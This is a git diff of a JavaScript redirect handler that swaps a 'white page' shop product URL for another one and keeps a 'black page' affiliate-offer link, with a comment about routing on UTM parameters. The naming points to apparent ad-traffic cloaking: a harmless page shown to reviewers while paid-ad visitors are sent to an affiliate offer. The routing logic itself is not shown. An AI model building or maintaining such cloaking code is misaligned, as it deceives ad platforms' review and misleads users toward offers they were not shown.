@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://luksusbaby.dk/collections/badetid/products/stokke-flexi-bath-x-large-lavender-1";
+    const whitePageURL = "https://nuuroo.com/collections/toys/products/pile-silicone-building-bricks-10-pcs-toy-brown-color-mix";
     const blackPageURL = "https://uplevelrewarded.com/aff_c?offer_id=1232&aff_id=45076";
   
     // Parse the UTM parameters from the request URL
@@ -25,4 +25,5 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
